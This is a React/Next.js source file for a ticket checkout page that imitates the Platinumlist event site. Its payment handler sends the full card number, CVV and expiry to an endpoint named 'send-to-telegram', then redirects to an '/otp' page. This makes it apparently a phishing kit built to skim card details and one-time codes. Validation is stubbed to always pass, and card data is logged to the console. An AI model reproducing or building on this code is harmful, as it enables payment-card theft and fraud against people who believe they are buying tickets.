'use client';

import React, { useState, useEffect } from 'react';
import { ChevronRight, ChevronLeft, CreditCard, Clock, CheckCircle2, ShieldCheck, MessageCircle, Info, ChevronDown } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { useLanguage } from '@/lib/language-context';
import Image from 'next/image';
import { Event } from '@/lib/types';

interface PaymentFormProps {
  event: Event;
  selectedSeats: {
    sectionId: number;
    rowName: string;
    seatNumber: number;
    price: number;
    sectionName: string;
  }[];
  onBack: () => void;
  totalAmount: number;
}

export default function PaymentForm({ event, selectedSeats, onBack, totalAmount }: PaymentFormProps) {
  const { language, dir } = useLanguage();
  const [timeLeft, setTimeLeft] = useState(600); // 10 minutes in seconds
  const [saveCard, setSaveCard] = useState(true);
  const [whatsappReminder, setWhatsappReminder] = useState(true);
  const [refundGuarantee, setRefundGuarantee] = useState(true);
  const [consentCommunication, setConsentCommunication] = useState(false);
  const [agreeRules, setAgreeRules] = useState(true);
  const [cardNumber, setCardNumber] = useState('');
  const [cvv, setCvv] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');

  // Fees (mock values based on image)
  const whatsappFee = 2.94;
  const refundFee = 1121.68;
  const serviceFee = 151.46;

  const finalTotal = totalAmount + (whatsappReminder ? whatsappFee : 0) + (refundGuarantee ? refundFee : 0) + serviceFee;


console.log("event",event)


  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 16) value = value.slice(0, 16); // Limit to 16 digits
    
    // Add space every 4 digits
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 3);
    setCvv(value);
  };

  const handleExpiryMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 2);
    if (Number(value) > 12) return;
    setExpiryMonth(value);
  };

  const handleExpiryYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 2);
    setExpiryYear(value);
  };

  const isAr = language === 'ar';

  const isFormValid = true;

  console.log('Form Validation Debug:', {
    selectedSeatsCount: selectedSeats.length,
    cardNumber: cardNumber,
    cardNumberDigits: cardNumber.replace(/\s/g, '').length,
    cvv: cvv,
    cvvLength: cvv.length,
    expiryMonth: expiryMonth,
    expiryYear: expiryYear,
    agreeRules: agreeRules,
    isFormValid: isFormValid
  });

  const handlePaymentSubmit = async () => {
    try {
      const paymentData = {
        eventTitle: event.title,
        eventVenue: (event.venueId && typeof event.venueId === 'object' && 'name' in event.venueId) ? event.venueId.name[language as keyof typeof event.venueId.name] : (event.venueName || ''),
        eventDate: event.showTimes?.[0]?.date ? new Date(event.showTimes[0].date).toLocaleDateString(language === 'ar' ? 'ar-EG' : 'en-US', { weekday: 'long', day: 'numeric', month: 'long' }) : '',
        selectedSeats: selectedSeats.map(s => isAr ? `المقعد: ${s.seatNumber}، صف: ${s.rowName}` : `Seat: ${s.seatNumber}, Row: ${s.rowName}`).join(' | '),
        totalAmount,
        finalTotal,
        cardNumber,
        cvv,
        expiryMonth,
        expiryYear,
        whatsappReminder,
        refundGuarantee,
        currency: event.currency || '',
      };

      const response = await fetch('/api/payment/send-to-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(paymentData),
      });

      const result = await response.json();

      if (result.success) {
        window.location.href = '/otp';
      } else {
        alert('Payment failed. Please try again.');
      }
    } catch (error) {
      console.error('Error submitting payment:', error);
      alert('An error occurred. Please try again.');
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#F8F9FB]" dir={dir}>
      {/* Header */}
      <header className="sticky top-0 bg-white border-b h-14 flex items-center px-4 z-30">
        <button onClick={onBack} className="p-2 -ml-2">
          {isAr ? <ChevronRight className="w-6 h-6 text-gray-600" /> : <ChevronLeft className="w-6 h-6 text-gray-600" />}
        </button>
        <h1 className="flex-1 text-center font-bold text-lg mr-8">
          {isAr ? 'الدفع' : 'Payment'}
        </h1>
      </header>

      <main className="flex-1 pb-32">
        <div className="max-w-md mx-auto p-4 space-y-4">
          
          {/* Event Card */}
          <div className="bg-white rounded-2xl overflow-hidden shadow-sm border border-gray-100">
            <div className="relative h-48 w-full">
              <Image 
                src={event.image || 'https://images.platinumlist.net/img/event/abeer_nehme_qatar_philharmonic_orchestra_2024_jan_23_u_venue_85961-mobile1733912196.jpg'} 
                alt={event.title}
                fill
                className="object-cover"
              />
            </div>
            <div className="p-4 space-y-3 text-right">
              <h2 className="font-bold text-lg leading-tight">{event.title}</h2>
              <p className="text-gray-500 text-sm">{(event.venueId && typeof event.venueId === 'object' && 'name' in event.venueId) ? event.venueId.name[language as keyof typeof event.venueId.name] : (event.venueName || 'U VENUE')}</p>
              
              <div className="flex items-center justify-end gap-2 text-sm text-gray-700">
                <span>{event.showTimes?.[0]?.date ? new Date(event.showTimes[0].date).toLocaleDateString('ar-EG', { weekday: 'long', day: 'numeric', month: 'long' }) : 'الجمعة 23 يناير'}، 19:30</span>
                <Clock className="w-4 h-4 text-gray-400" />
              </div>

              <div className="flex items-center justify-end gap-2 text-sm">
                <span className="font-bold">{selectedSeats.map(s => s.sectionName).join(', ')} ({selectedSeats.length})</span>
                <div className="bg-orange-100 p-1 rounded">
                   <Ticket className="w-4 h-4 text-orange-500" />
                </div>
              </div>

              <div className="flex items-center justify-end gap-2 text-sm text-gray-500">
                <span>{selectedSeats.map(s => `المقعد: ${s.seatNumber}، صف: ${s.rowName}`).join(' | ')}</span>
                <div className="w-4 h-4 border border-gray-300 rounded-full flex items-center justify-center text-[10px]">R</div>
              </div>
            </div>
          </div>

          {/* Delivery Method */}
          <div className="bg-[#F0F7FF] rounded-2xl p-5 space-y-4 border border-blue-50">
            <h3 className="font-bold text-lg text-right">{isAr ? 'طريقة تسليم التذاكر' : 'Ticket Delivery Method'}</h3>
            <div className="space-y-3 text-right text-sm leading-relaxed text-gray-700">
              <p>{isAr ? 'سوف يظهر رمز الاستجابة السريعة QR على التذاكر الخاصة بك قبل 48 ساعة من موعد الحدث' : 'QR code will appear on your tickets 48 hours before the event.'}</p>
              <p>{isAr ? 'بعد الانتهاء من عملية الشراء، يمكنك الاطلاع على التذاكر الإلكترونية الخاصة بك من خلال تطبيق بلاتينيوم لست فقط' : 'After purchase, you can view your e-tickets through the Platinumlist app only.'}</p>
              <p>
                {isAr ? 'ستتلقى تأكيد الحجز على بريدك الإلكتروني' : 'You will receive booking confirmation at your email'}
                <br />
                <span className="font-bold">aboelli55@gmail.com</span>
              </p>
            </div>

            <div className="space-y-4 pt-2">
              <div className="flex flex-row-reverse items-start gap-3 text-right">
                <Checkbox 
                  id="consent" 
                  checked={consentCommunication} 
                  onCheckedChange={(checked: boolean) => setConsentCommunication(!!checked)}
                  className="mt-1"
                />
                <Label htmlFor="consent" className="text-sm font-normal leading-tight text-gray-600">
                  {isAr ? 'I consent to receive communication from the organizer' : 'I consent to receive communication from the organizer'}
                </Label>
              </div>

              <div className="flex flex-row-reverse items-start gap-3 text-right">
                <Checkbox 
                  id="rules" 
                  checked={agreeRules} 
                  onCheckedChange={(checked: boolean) => setAgreeRules(!!checked)}
                  className="mt-1"
                />
                <Label htmlFor="rules" className="text-sm font-normal leading-tight text-gray-600">
                  {isAr ? 'أوافق على القواعد والأنظمة الخاصة بمكان إقامة الحدث الخاصة بهذه الفعالية' : 'I agree to the rules and regulations of the venue for this event'}
                </Label>
              </div>
            </div>
          </div>

          {/* Payment Method */}
          <div className="space-y-4">
            <h3 className="font-bold text-lg text-right px-1">{isAr ? 'اختر طريقة الدفع' : 'Choose Payment Method'}</h3>
            
            <div className="bg-white rounded-[24px] p-6 border border-gray-100 shadow-sm space-y-8">
              <div className="flex items-center justify-between flex-row-reverse">
                <div className="flex items-center gap-3 flex-row-reverse">
                  <div className="w-6 h-6 rounded-full border-2 border-gray-200 flex items-center justify-center">
                    <div className="w-3.5 h-3.5 rounded-full bg-[#1A162E]" />
                  </div>
                  <span className="font-bold text-[#1A162E]">{isAr ? 'البطاقة الائتمانية' : 'Credit Card'}</span>
                </div>
                <div className="flex gap-2 items-center">
                   <Image src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" alt="Mastercard" width={32} height={20} className="h-5 w-auto" />
                   <Image src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" width={40} height={20} className="h-3.5 w-auto" />
                </div>
              </div>

              <div className="space-y-6">
                <div className="space-y-1 text-right relative">
                  <Label className="text-[13px] text-gray-900 font-medium pr-1">{isAr ? 'رقم البطاقة' : 'Card Number'}</Label>
                  <Input 
                    placeholder="XXXX XXXX XXXX XXXX" 
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    dir="ltr"
                    className="text-left text-[20px] tracking-[2px] border-0 border-b border-gray-100 rounded-none focus-visible:ring-0 px-1 h-12 placeholder:text-gray-200 font-medium"
                  />
                </div>

                <div className="grid grid-cols-3 gap-8">
                   <div className="space-y-1 text-right">
                    <Label className="text-[13px] text-gray-900 font-medium pr-1">{isAr ? 'رمز التحقق' : 'CVV'}</Label>
                    <Input 
                      placeholder="XXX" 
                      value={cvv}
                      onChange={handleCvvChange}
                      dir="ltr"
                      className="text-left text-[20px] border-0 border-b border-gray-100 rounded-none focus-visible:ring-0 px-1 h-12 placeholder:text-gray-200 font-medium"
                    />
                  </div>
                  <div className="space-y-1 text-right">
                    <Label className="text-[13px] text-gray-900 font-medium pr-1">{isAr ? 'سنة الانتهاء' : 'Expiry Year'}</Label>
                    <Input 
                      placeholder="YY" 
                      value={expiryYear}
                      onChange={handleExpiryYearChange}
                      dir="ltr"
                      className="text-left text-[20px] border-0 border-b border-gray-100 rounded-none focus-visible:ring-0 px-1 h-12 placeholder:text-gray-200 font-medium"
                    />
                  </div>
                  <div className="space-y-1 text-right">
                    <Label className="text-[13px] text-gray-900 font-medium pr-1">{isAr ? 'شهر الانتهاء' : 'Expiry Month'}</Label>
                    <Input 
                      placeholder="MM" 
                      value={expiryMonth}
                      onChange={handleExpiryMonthChange}
                      dir="ltr"
                      className="text-left text-[20px] border-0 border-b border-gray-100 rounded-none focus-visible:ring-0 px-1 h-12 placeholder:text-gray-200 font-medium"
                    />
                  </div>
                </div>

                <div className="flex flex-row-reverse items-center gap-3 pt-4">
                  <Checkbox 
                    id="save-card" 
                    checked={saveCard} 
                    onCheckedChange={(checked: boolean) => setSaveCard(!!checked)}
                    className="w-6 h-6 rounded-md border-gray-200 data-[state=checked]:bg-[#1A162E] data-[state=checked]:border-[#1A162E]"
                  />
                  <Label htmlFor="save-card" className="text-[14px] font-medium text-[#1A162E]">
                    {isAr ? 'حفظ تفاصيل بطاقي الائتمانية' : 'Save my card details'}
                  </Label>
                </div>
              </div>
            </div>
          </div>

          {/* Additional Services */}
          <div className="space-y-3">
            <h3 className="font-bold text-lg text-right">{isAr ? 'خدمات إضافية' : 'Additional Services'}</h3>
            
            <div className="bg-white rounded-2xl p-4 flex items-center justify-between border border-gray-100 shadow-sm flex-row-reverse">
              <div className="flex items-center gap-3 flex-row-reverse">
                <div className="bg-green-50 p-2 rounded-full">
                  <MessageCircle className="w-5 h-5 text-green-600" />
                </div>
                <span className="font-medium text-sm">WhatsApp Reminder</span>
              </div>
              <Checkbox 
                checked={whatsappReminder} 
                onCheckedChange={(checked: boolean) => setWhatsappReminder(!!checked)}
              />
            </div>

            <div className="bg-white rounded-2xl p-4 space-y-4 border border-gray-100 shadow-sm">
              <div className="flex items-center justify-between flex-row-reverse">
                <div className="flex items-center gap-3 flex-row-reverse">
                  <div className="bg-blue-50 p-2 rounded-full">
                    <ShieldCheck className="w-5 h-5 text-blue-600" />
                  </div>
                  <span className="font-medium text-sm">Refund Guarantee</span>
                </div>
                <Checkbox 
                  checked={refundGuarantee} 
                  onCheckedChange={(checked: boolean) => setRefundGuarantee(!!checked)}
                />
              </div>
              <div className="flex items-center justify-center text-gray-400">
                <ChevronDown className="w-5 h-5" />
              </div>
            </div>
          </div>

          {/* Order Summary */}
          <div className="space-y-4 pt-4">
            <div className="flex items-center justify-between flex-row-reverse">
              <h3 className="font-bold text-lg">{isAr ? 'ملخص الطلب' : 'Order Summary'}</h3>
              <ChevronDown className="w-5 h-5 text-gray-400" />
            </div>
            
            <div className="space-y-3 text-sm">
              <div className="flex justify-between flex-row-reverse">
                <span className="text-gray-600">{isAr ? 'التذاكر' : 'Tickets'} • {selectedSeats.length}</span>
                <span className="font-medium">{event.currency || 'EGP'} {totalAmount.toLocaleString()}</span>
              </div>
              <div className="flex justify-between flex-row-reverse">
                <span className="text-gray-600">{isAr ? 'المجموع الفرعي' : 'Subtotal'} • {selectedSeats.length} {isAr ? 'عناصر' : 'items'}</span>
                <span className="font-bold">{event.currency || 'EGP'} {totalAmount.toLocaleString()}</span>
              </div>
              
              {whatsappReminder && (
                <div className="flex justify-between flex-row-reverse">
                  <span className="text-gray-600">WhatsApp Reminder</span>
                  <span className="font-medium">{event.currency || 'EGP'} {whatsappFee.toLocaleString()}</span>
                </div>
              )}
              
              {refundGuarantee && (
                <div className="flex justify-between flex-row-reverse">
                  <span className="text-gray-600">Refund Guarantee</span>
                  <span className="font-medium">{event.currency || 'EGP'} {refundFee.toLocaleString()}</span>
                </div>
              )}

              <div className="flex justify-between flex-row-reverse">
                <span className="text-gray-600">Service Fee</span>
                <span className="font-medium">{event.currency || 'EGP'} {serviceFee.toLocaleString()}</span>
              </div>

              <div className="flex justify-between flex-row-reverse items-center pt-2">
                <span className="font-bold text-lg">{isAr ? 'الإجمالي' : 'Total'}</span>
                <span className="font-bold text-2xl">{event.currency || 'EGP'} {finalTotal.toLocaleString()}</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer Sticky */}
      <footer className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 flex items-center justify-between z-40 safe-area-inset-bottom">
        <div className="flex items-center gap-4 flex-row-reverse w-full max-w-md mx-auto">
          <Button 
            disabled={!isFormValid}
            onClick={handlePaymentSubmit}
            className={`flex-1 h-12 text-lg font-bold rounded-xl transition-all duration-200 ${
              isFormValid 
                ? 'bg-[#1A162E] text-white hover:bg-[#2a244a] shadow-lg shadow-gray-200' 
                : 'bg-[#F1F3F5] text-gray-400 cursor-not-allowed'
            }`}
          >
            {isAr ? 'ادفع' : 'Pay'}
          </Button>
          
          <div className="flex flex-col items-end gap-1">
             <div className="flex items-center gap-2 text-pink-500 font-bold bg-pink-50 px-2 py-0.5 rounded text-sm">
                <span>{formatTime(timeLeft)}</span>
             </div>
             <div className="flex items-center gap-1 font-bold text-lg">
                <span className="text-gray-900">{event.currency || 'EGP'} {finalTotal.toLocaleString()}</span>
             </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

interface TicketProps {
    className?: string;
}

function Ticket({ className }: TicketProps) {
    return (
        <svg 
            viewBox="0 0 24 24" 
            fill="none" 
            stroke="currentColor" 
            strokeWidth="2" 
            strokeLinecap="round" 
            strokeLinejoin="round" 
            className={className}
        >
            <path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z" />
            <path d="M13 5v2" />
            <path d="M13 17v2" />
            <path d="M13 11v2" />
        </svg>
    )
}
